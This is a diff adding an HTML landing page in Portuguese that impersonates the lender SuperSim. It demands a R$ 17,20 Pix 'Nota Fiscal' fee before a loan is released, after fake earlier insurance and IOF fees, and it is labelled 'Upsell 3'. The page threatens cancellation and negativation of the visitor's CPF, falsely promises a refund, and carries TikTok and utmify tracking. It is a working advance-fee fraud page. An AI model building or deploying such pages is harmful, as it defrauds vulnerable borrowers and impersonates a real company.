@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="pt-BR" style="--primary: #38C0E5;">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Nota Fiscal de Servi&ccedil;o - SuperSim</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<script>
+  window.tikTokPixelId = "69dc17c453020b689ba08332";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Inter',system-ui,sans-serif;background:#f5f5f5;color:#333;line-height:1.6}
+.page-wrapper{max-width:520px;margin:0 auto;background:#fff;min-height:100vh}
+
+/* Header */
+.header{background:#fff;padding:16px 20px;text-align:center;border-bottom:3px solid var(--primary)}
+.header-logo{display:flex;align-items:center;justify-content:center;gap:8px}
+.header-logo svg{width:28px;height:28px}
+.header-logo span{font-size:18px;font-weight:700;color:#1B1B1B}
+
+/* Content */
+.content{padding:20px}
+.headline{color:#2e7d32;font-size:20px;font-weight:700;line-height:1.3;margin-bottom:8px}
+.divider{width:60px;height:3px;background:var(--primary);border-radius:2px;margin:12px 0}
+.description{font-size:14px;color:#555;margin-bottom:20px}
+
+/* Timeline / Stepper */
+.timeline{position:relative;padding-left:28px;margin:20px 0}
+.timeline::before{content:'';position:absolute;left:11px;top:0;bottom:0;width:2px;background:#e0e0e0}
+.step{position:relative;margin-bottom:20px;display:flex;align-items:flex-start;gap:12px}
+.step:last-child{margin-bottom:0}
+.dot{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:#fff;flex-shrink:0;position:relative;z-index:1}
+.dot.done{background:#2e7d32}
+.dot.current{background:#ef4444;animation:pulse-dot 1.5s infinite}
+.dot.pending{background:#ccc}
+@keyframes pulse-dot{0%,100%{box-shadow:0 0 0 0 rgba(239,68,68,.4)}50%{box-shadow:0 0 0 8px rgba(239,68,68,0)}}
+.step-text p{font-size:14px;font-weight:600;color:#333;margin-bottom:2px}
+.step-text small{font-size:12px;color:#888}
+.step.done .step-text p{color:#2e7d32}
+.step.current .step-text p{color:#ef4444}
+.step.pending .step-text p{color:#aaa}
+
+/* Warning */
+.payment-warning{background:#fff3cd;color:#856404;border:1px solid #ffeeba;border-radius:10px;padding:14px 16px;margin:20px 0;font-size:14px}
+
+/* Payment Card */
+.payment-card{background:#f9f9f9;border-radius:16px;padding:30px 24px;margin:20px 0;box-shadow:0 4px 20px rgba(0,0,0,.07);text-align:center}
+.payment-card h2{font-size:22px;color:#2e7d32;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:6px}
+.payment-card .confirmation{color:#333;font-size:13px;margin-bottom:16px}
+.payment-amount{margin:16px 0;font-size:18px;color:#333}
+.payment-amount strong{font-size:30px;color:#2e7d32;display:block;margin-top:4px}
+.payment-button{display:block;width:100%;max-width:320px;margin:0 auto;padding:16px;background:#2e7d32;color:#fff;font-size:17px;font-weight:700;border:none;border-radius:10px;cursor:pointer;text-decoration:none;text-align:center;transition:background .3s}
+.payment-button:hover{background:#1b5e20;text-decoration:none}
+.pulse{animation:pulseAnimation 1.5s infinite}
+@keyframes pulseAnimation{0%{transform:scale(1)}50%{transform:scale(1.04)}100%{transform:scale(1)}}
+
+/* FAQ */
+.faq{margin:24px 0}
+.faq h3{font-size:16px;color:#333;margin-bottom:12px;text-align:center}
+.faq-item{border:1px solid #e5e7eb;border-radius:8px;margin-bottom:8px;overflow:hidden}
+.faq-q{padding:12px 16px;font-size:13px;font-weight:600;color:#333;cursor:pointer;display:flex;justify-content:space-between;align-items:center}
+.faq-q:hover{background:#f9f9f9}
+.faq-a{display:none;padding:0 16px 12px;font-size:13px;color:#555;line-height:1.5}
+.faq-item.open .faq-a{display:block}
+
+/* Footer */
+.footer{text-align:center;padding:20px;font-size:11px;color:#999;border-top:1px solid #eee;margin-top:20px}
+</style>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  ttq.load('D7E1D63C77UFN826502G');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+</head>
+<body>
+<div class="page-wrapper">
+
+  <!-- Header -->
+  <div class="header">
+    <div class="header-logo">
+      <svg viewBox="0 0 24 24" width="28" height="28"><circle cx="12" cy="12" r="12" fill="#2e7d32"/><text x="12" y="16.5" text-anchor="middle" font-size="14" font-weight="bold" fill="#fff">C</text></svg>
+      <span>SuperSim</span>
+    </div>
+  </div>
+
+  <div class="content">
+
+    <!-- Headline -->
+    <h1 class="headline">Emiss&atilde;o da Nota Fiscal obrigat&oacute;ria para libera&ccedil;&atilde;o do empr&eacute;stimo!</h1>
+    <div class="divider"></div>
+    <p class="description">
+      Para garantir a <strong>conformidade fiscal</strong> e a seguran&ccedil;a do seu empr&eacute;stimo, &eacute; necess&aacute;rio o pagamento da taxa para emiss&atilde;o da Nota Fiscal de Servi&ccedil;o eletr&ocirc;nica (NFS-e). Esta taxa cobre os custos administrativos associados &agrave; emiss&atilde;o e entrega do valor.
+    </p>
+
+    <!-- Timeline / Stepper -->
+    <div class="timeline">
+      <div class="step done">
+        <div class="dot done">&#10003;</div>
+        <div class="step-text"><p>Simula&ccedil;&atilde;o</p><small>Simula&ccedil;&atilde;o realizada e cadastro conclu&iacute;do</small></div>
+      </div>
+      <div class="step done">
+        <div class="dot done">&#10003;</div>
+        <div class="step-text"><p>Pagamento do Seguro Prestamista</p><small>Pagamento conclu&iacute;do com sucesso</small></div>
+      </div>
+      <div class="step done">
+        <div class="dot done">&#10003;</div>
+        <div class="step-text"><p>Pagamento do Imposto IOF</p><small>Pagamento conclu&iacute;do com sucesso</small></div>
+      </div>
+      <div class="step current">
+        <div class="dot current">!</div>
+        <div class="step-text"><p>Emiss&atilde;o da Nota Fiscal</p><small>Aguardando pagamento da taxa de emiss&atilde;o</small></div>
+      </div>
+      <div class="step pending">
+        <div class="dot pending">5</div>
+        <div class="step-text"><p>Cr&eacute;dito na conta</p><small>Cr&eacute;dito enviado para sua conta banc&aacute;ria</small></div>
+      </div>
+    </div>
+
+    <!-- Warning -->
+    <div class="payment-warning">
+      &#x26A0;&#xFE0F; O <strong>n&atilde;o pagamento da taxa</strong> para a emiss&atilde;o da nota fiscal resultar&aacute; no <strong>cancelamento do contrato</strong> e o CPF informado ser&aacute; negativado. Esta regra &eacute; imut&aacute;vel e n&atilde;o h&aacute; exce&ccedil;&otilde;es.
+    </div>
+
+    <!-- Payment Card -->
+    <div class="payment-card">
+      <h2>
+        Pague via Pix
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+          <path fill="currentColor" d="m15.45 16.52-3.01-3.01c-.11-.11-.24-.13-.31-.13s-.2.02-.31.13L8.8 16.53c-.34.34-.87.89-2.64.89l3.71 3.7a3 3 0 0 0 4.24 0l3.72-3.71c-.91 0-1.67-.18-2.38-.89M8.8 7.47l3.02 3.02c.08.08.2.13.31.13s.23-.05.31-.13l2.99-2.99c.71-.74 1.52-.91 2.43-.91l-3.72-3.71a3 3 0 0 0-4.24 0l-3.71 3.7c1.76 0 2.3.58 2.61.89"/>
+          <path fill="currentColor" d="m21.11 9.85-2.25-2.26H17.6c-.54 0-1.08.22-1.45.61l-3 3c-.28.28-.65.42-1.02.42a1.5 1.5 0 0 1-1.02-.42L8.09 8.17c-.38-.38-.9-.6-1.45-.6H5.17l-2.29 2.3a3 3 0 0 0 0 4.24l2.29 2.3h1.48c.54 0 1.06-.22 1.45-.6l3.02-3.02c.28-.28.65-.42 1.02-.42s.74.14 1.02.42l3.01 3.01c.38.38.9.6 1.45.6h1.26l2.25-2.26a3.04 3.04 0 0 0-.02-4.29"/>
+        </svg>
+      </h2>
+      <p class="confirmation">&#x2705; Pagamento confirmado imediatamente</p>
+
+      <div class="payment-amount">
+        <span>Valor da taxa de emiss&atilde;o:</span>
+        <strong>R$ 17,20</strong>
+      </div>
+
+      <a href="javascript:void(0)" id="botaoPagar" class="payment-button pulse" onclick="SuperSimPix.open(17.20, 'Pagamento Upsell 3'); return false;">Pagar Agora</a>
+    </div>
+
+    <!-- FAQ -->
+    <div class="faq">
+      <h3>Perguntas Frequentes</h3>
+      <div class="faq-item">
+        <div class="faq-q" onclick="this.parentElement.classList.toggle('open')">O que &eacute; a NFS-e? <span>+</span></div>
+        <div class="faq-a">A Nota Fiscal de Servi&ccedil;o eletr&ocirc;nica (NFS-e) &eacute; um documento obrigat&oacute;rio emitido para formalizar a presta&ccedil;&atilde;o de servi&ccedil;os financeiros, garantindo a conformidade fiscal da opera&ccedil;&atilde;o.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="this.parentElement.classList.toggle('open')">Por que preciso pagar essa taxa? <span>+</span></div>
+        <div class="faq-a">A taxa cobre os custos administrativos associados &agrave; emiss&atilde;o da nota fiscal e &eacute; obrigat&oacute;ria para a libera&ccedil;&atilde;o do cr&eacute;dito em sua conta.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="this.parentElement.classList.toggle('open')">O que acontece se eu n&atilde;o pagar? <span>+</span></div>
+        <div class="faq-a">O n&atilde;o pagamento impedir&aacute; a emiss&atilde;o da nota fiscal, resultando no cancelamento do contrato e na impossibilidade de nova contrata&ccedil;&atilde;o por at&eacute; 90 dias.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="this.parentElement.classList.toggle('open')">O valor &eacute; reembols&aacute;vel? <span>+</span></div>
+        <div class="faq-a">Sim, o valor da taxa &eacute; 100% reembols&aacute;vel ao final do contrato de empr&eacute;stimo, conforme previsto nos termos de uso.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    &copy; 2025 SuperSim S.A. CNPJ: 60.779.196/0001-96<br>
+    Todos os direitos reservados.
+  </div>
+</div>
+
+<script>
+function obterParametrosUTM() {
+  var params = {};
+  var qs = window.location.search.substring(1);
+  qs.split('&').forEach(function(p) {
+    var kv = p.split('=');
+    if (kv[0]) params[decodeURIComponent(kv[0])] = decodeURIComponent(kv[1] || '');
+  });
+  return params;
+}
+function adicionarUTMsURL(base, utms) {
+  var url = new URL(base);
+  Object.keys(utms).forEach(function(k) { url.searchParams.set(k, utms[k]); });
+  return url.toString();
+}
+document.addEventListener('DOMContentLoaded', function() {
+  var urlDestino = "seulink";
+  var utms = obterParametrosUTM();
+  var botao = document.getElementById('botaoPagar');
+  if (botao) botao.href = adicionarUTMsURL(urlDestino, utms);
+});
+</script>
+<script src="/js/pix-popup.js" defer></script>
+<script src="/api/tracker.js" defer></script></body>
+</html>
